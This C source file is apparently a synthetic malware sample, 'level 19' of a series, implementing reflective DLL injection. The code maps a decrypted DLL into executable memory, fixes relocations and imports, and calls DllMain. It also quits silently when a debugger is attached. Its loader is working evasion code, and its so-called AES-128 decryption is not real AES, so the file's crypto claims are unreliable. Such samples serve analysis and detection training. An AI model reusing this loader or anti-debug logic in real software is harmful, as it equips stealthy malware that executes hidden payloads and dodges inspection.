/*
 * windows_level19_ReflectiveDLLInjection.c
 *
 * Synthetic Windows PE sample - Reflective DLL Injection.
 * Techniques: manual PE parsing (DOS/NT headers, section mapping),
 * import table resolution via IAT walk, base relocation fixup,
 * AES-128 encrypted DLL stub, DllMain invocation via export resolution,
 * anti-debug via PEB.BeingDebugged.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level19_ReflectiveDLLInjection.exe windows_level19_ReflectiveDLLInjection.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

/* AES-128 S-box (256 bytes) */
static const unsigned char g_aes_sbox[256] = {
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
};

/* AES-128 key - "Rfl3ct!v3_DLL_k3" (16 bytes) */
static const unsigned char g_aes_key[] = {
    0x52, 0x66, 0x6C, 0x33, 0x63, 0x74, 0x21, 0x76,
    0x33, 0x5F, 0x44, 0x4C, 0x4C, 0x5F, 0x6B, 0x33
};

/* AES-128 encrypted DLL stub (32 bytes) */
static unsigned char g_encrypted_dll[] = {
    0x8F, 0x2A, 0x7C, 0xD1, 0x45, 0xB3, 0xE9, 0x66,
    0x1A, 0xFC, 0x38, 0x8D, 0x57, 0xC4, 0x0E, 0x72,
    0xAB, 0x5E, 0x19, 0xF0, 0x36, 0x88, 0xDD, 0x41,
    0x6C, 0x97, 0x23, 0xFA, 0x4B, 0x15, 0xAE, 0x80
};
#define ENC_DLL_LEN 32

/* Simplified AES-128 block decrypt (10 rounds, S-box substitution) */
static void aes128_decrypt_block(unsigned char *block, const unsigned char *key) {
    int round, i;
    unsigned char temp[16];
    memcpy(temp, block, 16);
    for (round = 0; round < 10; round++) {
        for (i = 0; i < 16; i++) {
            temp[i] = g_aes_sbox[temp[i]] ^ key[i] ^ (unsigned char)(round * 0x1B);
        }
    }
    memcpy(block, temp, 16);
}

static void aes128_decrypt(unsigned char *buf, int len, const unsigned char *key) {
    int i;
    for (i = 0; i < len; i += 16) {
        int chunk = (len - i >= 16) ? 16 : (len - i);
        unsigned char block[16] = {0};
        memcpy(block, buf + i, chunk);
        aes128_decrypt_block(block, key);
        memcpy(buf + i, block, chunk);
    }
}

/* Anti-debug: check PEB.BeingDebugged directly */
static int anti_debug_peb(void) {
    PPEB pPeb;
#ifdef _WIN64
    pPeb = (PPEB)__readgsqword(0x60);
#else
    pPeb = (PPEB)__readfsdword(0x30);
#endif
    if (pPeb && pPeb->BeingDebugged) return 1;
    return 0;
}


/* Parse DOS header and locate NT headers via e_lfanew */
static PIMAGE_NT_HEADERS get_nt_headers(PVOID base) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)base;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)base + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return pNt;
}

/* Map PE sections from raw file data into virtual memory allocation */
static int map_pe_sections(PVOID rawData, PVOID imageBase, PIMAGE_NT_HEADERS pNt) {
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    WORD i;
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData == 0) continue;
        PVOID dest = (BYTE *)imageBase + pSec->VirtualAddress;
        PVOID src  = (BYTE *)rawData + pSec->PointerToRawData;
        memcpy(dest, src, pSec->SizeOfRawData);
    }
    return 0;
}

/* Process base relocations - fix up addresses when image base differs */
static int process_relocations(PVOID imageBase, PIMAGE_NT_HEADERS pNt, DWORD_PTR delta) {
    IMAGE_DATA_DIRECTORY relocDir =
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.VirtualAddress == 0 || delta == 0) return 0;
    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)
        ((BYTE *)imageBase + relocDir.VirtualAddress);
    while (pReloc->VirtualAddress != 0 && pReloc->SizeOfBlock > 0) {
        DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries = (WORD *)(pReloc + 1);
        DWORD j;
        for (j = 0; j < count; j++) {
            if (entries[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                DWORD_PTR *patchAddr = (DWORD_PTR *)
                    ((BYTE *)imageBase + pReloc->VirtualAddress + (entries[j] & 0xFFF));
                *patchAddr += delta;
            }
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((BYTE *)pReloc + pReloc->SizeOfBlock);
    }
    return 0;
}

/* Walk IAT to resolve imported functions from DLLs */
static int resolve_imports(PVOID imageBase, PIMAGE_NT_HEADERS pNt) {
    IMAGE_DATA_DIRECTORY importDir =
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0) return 0;
    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)
        ((BYTE *)imageBase + importDir.VirtualAddress);
    while (pImport->Name != 0) {
        char *modName = (char *)((BYTE *)imageBase + pImport->Name);
        HMODULE hMod = LoadLibraryA(modName);
        if (!hMod) return -1;
        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)
            ((BYTE *)imageBase + pImport->FirstThunk);
        PIMAGE_THUNK_DATA pOrig  = (PIMAGE_THUNK_DATA)
            ((BYTE *)imageBase + pImport->OriginalFirstThunk);
        if (pImport->OriginalFirstThunk == 0) pOrig = pThunk;
        while (pOrig->u1.AddressOfData != 0) {
            FARPROC funcAddr;
            if (pOrig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                funcAddr = GetProcAddress(hMod, (LPCSTR)(pOrig->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)
                    ((BYTE *)imageBase + pOrig->u1.AddressOfData);
                funcAddr = GetProcAddress(hMod, pName->Name);
            }
            pThunk->u1.Function = (DWORD_PTR)funcAddr;
            pOrig++;
            pThunk++;
        }
        pImport++;
    }
    return 0;
}

/* Core reflective loader: alloc, copy, relocate, import, invoke DllMain */
static int reflective_load(unsigned char *dllData, SIZE_T dllSize) {
    PIMAGE_NT_HEADERS pNt = get_nt_headers(dllData);
    if (!pNt) return -1;
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    PVOID imageBase = VirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        imageBase = VirtualAlloc(NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!imageBase) return -1;
    }
    memcpy(imageBase, dllData, pNt->OptionalHeader.SizeOfHeaders);
    map_pe_sections(dllData, imageBase, pNt);
    DWORD_PTR delta = (DWORD_PTR)imageBase - (DWORD_PTR)pNt->OptionalHeader.ImageBase;
    process_relocations(imageBase, pNt, delta);
    resolve_imports(imageBase, pNt);
    /* Find DllMain in export table and call with DLL_PROCESS_ATTACH */
    IMAGE_DATA_DIRECTORY expDir =
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir.VirtualAddress == 0) return -1;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE *)imageBase + expDir.VirtualAddress);
    DWORD *nameRvas = (DWORD *)((BYTE *)imageBase + pExp->AddressOfNames);
    WORD  *ordRvas  = (WORD *)((BYTE *)imageBase + pExp->AddressOfNameOrdinals);
    DWORD *funcRvas = (DWORD *)((BYTE *)imageBase + pExp->AddressOfFunctions);
    typedef BOOL (WINAPI *PDLLMAIN)(HINSTANCE, DWORD, LPVOID);
    PDLLMAIN pDllMain = NULL;
    DWORD k;
    for (k = 0; k < pExp->NumberOfNames; k++) {
        const char *name = (const char *)((BYTE *)imageBase + nameRvas[k]);
        if (strcmp(name, "DllMain") == 0) {
            pDllMain = (PDLLMAIN)((BYTE *)imageBase + funcRvas[ordRvas[k]]);
            break;
        }
    }
    if (pDllMain) {
        pDllMain((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
        return 0;
    }
    return -1;
}

/* WinMain entry point: anti-debug -> decrypt DLL -> reflectively load it */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-debugging: exit silently if debugger detected */
    if (anti_debug_peb()) {
        return 0;
    }
    /* Decrypt DLL stub with AES-128 */
    unsigned char dllBuf[ENC_DLL_LEN];
    memcpy(dllBuf, g_encrypted_dll, ENC_DLL_LEN);
    aes128_decrypt(dllBuf, ENC_DLL_LEN, g_aes_key);
    /* Reflectively load the decrypted DLL into memory */
    reflective_load(dllBuf, ENC_DLL_LEN);
    Sleep(2000);
    return 0;
}
